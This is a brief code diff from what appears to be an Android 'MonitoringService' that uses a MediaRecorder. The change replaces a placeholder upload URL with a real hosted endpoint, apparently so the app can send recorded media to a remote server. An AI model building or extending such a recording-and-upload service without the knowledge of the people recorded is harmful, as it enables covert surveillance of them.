@@ -15,7 +15,7 @@ class MonitoringService : Service() {
 
     private var mediaRecorder: MediaRecorder? = null
     private val CHANNEL_ID = "monitoring_channel"
-    private val SERVER_URL = "https://your-server.com/upload" // baad mein change karenge
+    private val SERVER_URL = "https://overflowing-perception-production-17b2.up.railway.app/upload"
 
     override fun onCreate() {
         super.onCreate()
